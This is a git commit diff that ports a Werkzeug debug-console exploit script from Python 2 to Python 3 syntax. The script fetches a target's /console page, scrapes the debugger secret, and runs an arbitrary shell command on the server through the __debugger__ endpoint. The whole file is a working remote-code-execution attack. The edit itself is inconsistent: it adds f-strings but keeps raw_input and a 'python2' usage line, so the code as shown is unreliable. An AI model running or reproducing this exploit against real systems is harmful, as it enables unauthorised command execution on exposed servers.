663aac7065102612c79bc197d60b7dee04176d0a
Caldun1 <93448611+Caldun1@users.noreply.github.com>
2024-04-15 20:22:21 -0100

    Update werkzeug.py

--- werkzeug.py
+++ werkzeug.py
@@ -6,34 +6,34 @@ import re
 import urllib
 
 if len(sys.argv) != 3:
-    print "USAGE: python2 %s <website> <cmd>" % (sys.argv[0])
+    print(f"USAGE: python2 {sys.argv[0]} <website> <cmd>")
     sys.exit(-1)
 
-response = requests.get('http://%s/console' % (sys.argv[1]))
+response = requests.get(f'http://{sys.argv[1]}/console')
 
 if "Werkzeug powered traceback interpreter" not in response.text:
-    print "[-] Debug is not enabled"
+    print("[-] Debug is not enabled")
     sys.exit(-1)
 
-cmd = '''__import__('os').popen(\'%s\').read();''' % (sys.argv[2])
+cmd = f'''__import__('os').popen(\'{sys.argv[2]}\').read();'''
 
-response = requests.get('http://%s/console' % (sys.argv[1]))
+response = requests.get(f'http://{sys.argv[1]}/console')
 
 secret = re.findall("[0-9a-zA-Z]{20}",response.text)
 
 if len(secret) != 1:
-    print "[-] Couldn't get the SECRET"
+    print("[-] Couldn't get the SECRET")
     sys.exit(-1)
 else:
     secret = secret[0]
-    print "[+] SECRET is: "+str(secret)
+    print(f"[+] SECRET is: {str(secret)}")
 
-print "[+] Script will try executing %s on %s" % (sys.argv[2],sys.argv[1])
+print(f"[+] Script will try executing {sys.argv[2]} on {sys.argv[1]}") 
 
 raw_input("Press any key to execute")
 
 response = requests.get("http://%s/console?__debugger__=yes&cmd=%s&frm=0&s=%s" % (sys.argv[1],str(cmd),secret))
 
-print "[+] response from server"
-print "status code: " + str(response.status_code)
-print "response: "+ str(response.text)
+print("[+] response from server")
+print(f"status code: {str(response.status_code)}")
+print(f"response: {str(response.text)}")
